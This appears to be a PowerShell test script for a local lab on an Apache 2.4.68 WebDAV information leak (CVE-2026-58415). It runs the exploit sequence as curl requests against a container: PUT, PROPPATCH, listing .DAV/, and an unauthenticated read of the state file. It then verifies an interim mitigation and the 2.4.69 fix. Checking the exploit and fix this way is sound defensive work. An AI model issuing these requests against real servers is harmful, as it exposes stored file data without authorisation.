<#
    verify.ps1 - automated end-to-end check for the CVE-2026-58415 WebDAV lab.

    Builds both targets, runs the exploit + mitigation + permanent-fix flow, and
    asserts every expected result from RUNBOOK.md. Prints PASS/FAIL per step and
    exits 0 only if all checks pass (non-zero otherwise). Tears down afterwards.

    Requires: Docker Desktop running; curl.exe (ships with Windows 10/11).
    Run from the repository root:  powershell -ExecutionPolicy Bypass -File verify.ps1

    Note: ErrorActionPreference is intentionally left at 'Continue'. Windows
    PowerShell 5.1 promotes native-command stderr (curl.exe, docker) to a
    terminating error under 'Stop', which would abort mid-run; here we check
    results explicitly instead.
#>

$script:pass = 0
$script:fail = 0

function Check {
    param([string]$Name, [bool]$Ok, [string]$Got = '')
    if ($Ok) {
        Write-Host ("  PASS  {0}" -f $Name) -ForegroundColor Green
        $script:pass++
    } else {
        Write-Host ("  FAIL  {0}  (got: {1})" -f $Name, $Got) -ForegroundColor Red
        $script:fail++
    }
}

# HTTP status code of a curl request (extra args passed through to curl.exe).
function Code { param([string[]]$CurlArgs)
    (& curl.exe -s -o NUL -w "%{http_code}" @CurlArgs 2>$null)
}

# Run a native command discarding all output (used for cleanup/teardown).
function Silent { param([string]$Cmd) cmd /c "$Cmd >nul 2>nul" | Out-Null }

$V = '8080'   # vulnerable target port
$P = '8081'   # patched target port

try {
    Write-Host "== Cleaning any previous lab containers ==" -ForegroundColor Cyan
    Silent "docker rm -f dav dav69"

    Write-Host "== Building and starting the 2.4.68 (vulnerable) target ==" -ForegroundColor Cyan
    Silent "docker build -t dav-target ."
    Silent ("docker run -d --name dav -p 127.0.0.1:{0}:80 dav-target" -f $V)
    Start-Sleep -Seconds 2

    # --- Step 2: version + modules (B2.1) ---
    $ver = (docker exec dav httpd -v 2>$null | Select-Object -First 1)
    Check "2.4.68 target version" ($ver -match '2\.4\.68') $ver
    $mods = (docker exec dav httpd -M 2>$null | Out-String)
    Check "dav_module + dav_fs_module loaded" (($mods -match 'dav_module') -and ($mods -match 'dav_fs_module'))

    # --- Step 3: OPTIONS confirms WebDAV (B2.2) ---
    Check "OPTIONS /webdav/ = 200" ((Code @('-X','OPTIONS',"http://127.0.0.1:$V/webdav/")) -eq '200')

    # --- Step 4: PUT + PROPPATCH (B2.3) ---
    Check "PUT demo.txt = 201" ((Code @('-T','demo.txt',"http://127.0.0.1:$V/webdav/demo.txt")) -eq '201')
    Check "PROPPATCH = 207" ((Code @('-X','PROPPATCH',"http://127.0.0.1:$V/webdav/demo.txt",'-H','Content-Type: application/xml','--data-binary','@proppatch.xml')) -eq '207')

    # --- Step 5: .DAV/ listing reveals the state file (B2.4) ---
    $listing = (& curl.exe -s "http://127.0.0.1:$V/webdav/.DAV/" 2>$null | Out-String)
    Check ".DAV/ listing shows demo.txt" ($listing -match 'demo\.txt')

    # --- Step 6: unauthenticated read of the state file (B2.5) ---
    $size = (& curl.exe -s -o leaked.bin -w "%{size_download}" "http://127.0.0.1:$V/webdav/.DAV/demo.txt" 2>$null)
    $codeState = (Code @("http://127.0.0.1:$V/webdav/.DAV/demo.txt"))
    Check "GET .DAV/demo.txt = 200" ($codeState -eq '200') $codeState
    Check "state file body is non-empty" ([int]$size -gt 0) "$size bytes"

    # --- Step 7: recover the planted marker (B2.6) ---
    $marker = $false
    if (Test-Path leaked.bin) {
        $bytes = [IO.File]::ReadAllBytes((Join-Path $PWD 'leaked.bin'))
        $text  = [Text.Encoding]::ASCII.GetString($bytes)
        $marker = ($text -match 'ACW3-VERIFY-MARKER')
    }
    Check "marker ACW3-VERIFY-MARKER recovered" $marker

    # --- Step 8: apply mitigation, re-test (B2.7) ---
    Write-Host "== Applying interim mitigation ==" -ForegroundColor Cyan
    Silent "docker cp mitigation.conf dav:/usr/local/apache2/conf/mitigation.conf"
    docker exec dav sh -c "echo 'Include conf/mitigation.conf' >> conf/httpd.conf" 2>$null | Out-Null
    docker exec dav apachectl -k graceful 2>$null | Out-Null
    Start-Sleep -Seconds 1
    Check "after mitigation: GET .DAV/demo.txt = 403" ((Code @("http://127.0.0.1:$V/webdav/.DAV/demo.txt")) -eq '403')
    Check "after mitigation: PROPFIND still = 207" ((Code @('-X','PROPFIND',"http://127.0.0.1:$V/webdav/demo.txt",'-H','Depth: 0')) -eq '207')

    # --- Step 9: permanent fix on 2.4.69 (D1-D4) ---
    Write-Host "== Building and starting the 2.4.69 (patched) target ==" -ForegroundColor Cyan
    Silent "docker build -f Dockerfile69 -t dav-target-69 ."
    Silent ("docker run -d --name dav69 -p 127.0.0.1:{0}:80 dav-target-69" -f $P)
    Start-Sleep -Seconds 2

    $ver69 = (docker exec dav69 httpd -v 2>$null | Select-Object -First 1)
    Check "D1: 2.4.69 target version" ($ver69 -match '2\.4\.69') $ver69
    Check "D2: PUT = 201 (WebDAV works)" ((Code @('-T','demo.txt',"http://127.0.0.1:$P/webdav/demo.txt")) -eq '201')
    Check "D2: PROPPATCH = 207" ((Code @('-X','PROPPATCH',"http://127.0.0.1:$P/webdav/demo.txt",'-H','Content-Type: application/xml','--data-binary','@proppatch.xml')) -eq '207')
    Check "D3: GET .DAV/ listing = 403 (no workaround)" ((Code @("http://127.0.0.1:$P/webdav/.DAV/")) -eq '403')
    Check "D3: GET .DAV/demo.txt = 403 (no workaround)" ((Code @("http://127.0.0.1:$P/webdav/.DAV/demo.txt")) -eq '403')
    Check "D4: PROPFIND = 207 (WebDAV unaffected)" ((Code @('-X','PROPFIND',"http://127.0.0.1:$P/webdav/demo.txt",'-H','Depth: 0')) -eq '207')
}
finally {
    Write-Host "== Teardown ==" -ForegroundColor Cyan
    if (Test-Path leaked.bin) { Remove-Item leaked.bin -Force }
    Silent "docker rm -f dav dav69"
    Silent "docker rmi dav-target dav-target-69"
}

Write-Host ""
$resultColor = 'Green'; if ($script:fail -gt 0) { $resultColor = 'Red' }
Write-Host ("RESULT: {0} passed, {1} failed" -f $script:pass, $script:fail) -ForegroundColor $resultColor
if ($script:fail -gt 0) { exit 1 } else { exit 0 }
